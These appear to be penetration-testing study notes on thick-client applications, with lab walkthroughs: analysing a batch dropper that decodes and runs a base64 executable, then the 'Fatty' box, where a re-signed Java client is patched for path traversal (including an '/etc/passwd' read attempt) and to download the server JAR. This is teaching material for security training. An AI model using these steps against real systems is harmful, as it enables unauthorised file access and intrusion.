## What are they 
* Applications that are installed locally on our computers. Unlike applications we can access through a web page.
* Usually used in enterprises environments created to server specific purposes. 
* Usually developed using Java, C++, .NET or Microsoft Silverlight.
	* Java has a technology called sandbox. Virtual environment that allows untrusted code to run safely on a users system without posing a security risk. 
	* In .NET a tick client is also known as a rich client or fat client. 
* Characteristics: 
	* Independent software
	* Working without internet access
	* Storing data locally 
	* Less Secure
	* Consuming more resources 
	* More expensive.
![[Pasted image 20231019133502.png]]
* Web specific vulnerabilities do not apply to thick clients. However they are vulnerable to other types:
	* Improper Error handling 
	* Hard-coded sensitive data 
	* DLL Hijacking
	* Buffer Overflow 
	* SQLi
	* Insecure Storage 
	* Session Management
## Penetration Testing Steps
### Information Gathering 
* Identify the application architecture 
* The programming languages and frameworks. 
* Identify technologies that are used on the client and server sides. 
#### Useful Tools
* [CFF Explorer](https://ntcore.com/?page_id=388)
* [Detect it Easy](https://github.com/horsicq/Detect-It-Easy)
* [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
* [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)
### Client Side Attacks
* Many thick clients will still communicate with servers for various tasks.
* This can expose vulnerabilities similar to those found in web applications. 
* Sensitive information might be hard coded in the source code. 
#### Tools
* [Ghidra](https://www.ghidra-sre.org/)
* [IDA](https://hex-rays.com/ida-pro/)
* [OllyDbg](http://www.ollydbg.de/)
* [Radare2](https://www.radare.org/r/index.html)
* [dnSpy](https://github.com/dnSpy/dnSpy)
* [x64dbg](https://x64dbg.com/)
* [JADX](https://github.com/skylot/jadx)
* [Frida](https://frida.re/)
### Network Side Attacks 
* Network traffic analysis will help us capture sensitive information.
* Use tools like Burp suite and Wireshark
# Attacking Thick Client Applications
## Retrieving hard-coded credentials from Thick-Client Applications
### Example:
* Exploited SMB Service with `RestartOracle-Service.exe`
* Downloading [`ProcMon64`](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) shows that files are created in Temp folders
![[Pasted image 20231019134705.png]]
* Capture the files by disallowing file deletions in Temp folders
	* `C:\Users\Matt\AppData\Local\Temp` and under `Properties` -> `Security` -> `Advanced` -> `cybervaca` -> `Disable inheritance` -> `Convert inherited permissions into explicit permissions on this object` -> `Edit` -> `Show advanced permissions`, we deselect the `Delete subfolders and files`, and `Delete`
![[Pasted image 20231019134814.png]]
* Check the temp folders. 
```batch
@shift /0
@echo off

if %username% == matt goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<SNIP>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```
* 2 files are dropped by the batch file and being deleted.
* Edit the batch script:
```batch
@shift /0
@echo off

echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<SNIP>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
```
* Re-execute the batch script. 
* The 2 files are not deleted. one of which is a script:
* Run the script. 
* Recheck through ProcMon64
![[Pasted image 20231019135128.png]]
* Start `x64dbg` > options > preferences
	* Uncheck everything accept Exit Breakpoint.
	* This means the debugging will start directly from the applications exit point. Rather than load lots of DLLs.
* Import the exe and start debugging
* `CPU` > `Follow in Memory map`
* Look for memory mapped files. (MAP) These allow applications to access large files without having to read or write the entire file into memory at once. 
![[Pasted image 20231019135502.png]]
* Double click on it and look for the magic bytes
* `4D 5A / MZ` is a DOS executable. 
* Right click the memory address (far left column) and `dump memory to file`
* Run strings on this:
```powershell
C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin
```
* This will show a .NET executable is being used. 
* Use `De4Dot` to reverse the .NET executable by dragging `restart-service_00000000001E0000.bin` into `de4dot` executable. 
* Now read the source code of the application with in `DNSpy`
## Exploiting Web Vulnerabilities in Thick-Client Applications
* It is common to encounter a thick client application that connects to  server to communicate with the database. 
### Example:
* You find a Jar file that has a web application to log in. 
* Look at log files to see what is happening
![[Pasted image 20231020102951.png]]
* Add the domain to /etc/hosts:
```cmd
echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```
* Intercept again 
![[Pasted image 20231020103151.png]]
* Notice the different port number
```powershell
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```
```powershell
 cat fatty-client\beans.xml
```
* Edit the port to 1337: 
	* `<constructor-arg index="1" value = "8000"/>` and set the port to `1337`
* Notice that the `.jar` is signed: 
```powershell
cat fatty-client\META-INF\MANIFEST.MF
```
* Remove the hashes from `META-INF/MANIFEST.MF` and delete the 1.RSA and 1.SF files from the `META-INF` directory. 
* Run the new JAR
```powershell
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```
* Login with the credentials `qtc / clarabii`
* Try path traversal attack
```txt
../../../../../../etc/passwd
```
* The program filters the `/`
* Decompile `fatty-client-new.jar` onto the [jd-gui](http://java-decompiler.github.io/) 
* Save the source code by pressing `Save All Sources`
* Decompress the `fatty-client-new.jar.src.zip` by right-clicking and selecting `Extract files`
```java
public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
```
* The function takes in one argument for the folder name and then sends the data to the server using the sendandrecv() call. 
* The file `fatty-client-new.jar/htb/fatty/client/gui/ClientGuiTest.java` sets the folder option.
```java
configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
```
* Replace the `configs` folder name with 
```java
ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");
```
* Compile the ClientGuiTest.java
```powershell
javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```
* This generates several class files. 
```powershell
mkdir raw
cp fatty-client-new.jar raw\fatty-client-new-2.jar
```
* Decompress the `fatty-client-new-2.jar`, Overwrite any other classes
```powershell
mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```
* Build the new JAR file 
```powershell
jar -cmf META-INF\MANIFEST.MF traverse.jar .
```
* Login to the File Browser
* Look at start.sh
![[Pasted image 20231020105417.png]]
* Notice it is running in a docker container. 
* Modify the `open` function in `fatty-client-new.jar.src/htb/fatty/client/methos/Invoker.java` and download the file `fatty-server.jar` with the following code
```java
import java.io.FileOutputStream;
<SNIP>
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    
    return "Successfully saved the file to " + desktopPath;
}
<SNIP>
```
* Rebuild the JAR file. and log in. 
* Click the open button and add `fatty-server.jar`
#### SQL Injection
* Decompile `fatty-server.jar` using JD-GUI.
* This reveals the file `htb/fatty/server/database/FattyDbSession.class` that contains a `checkLogin()` function. 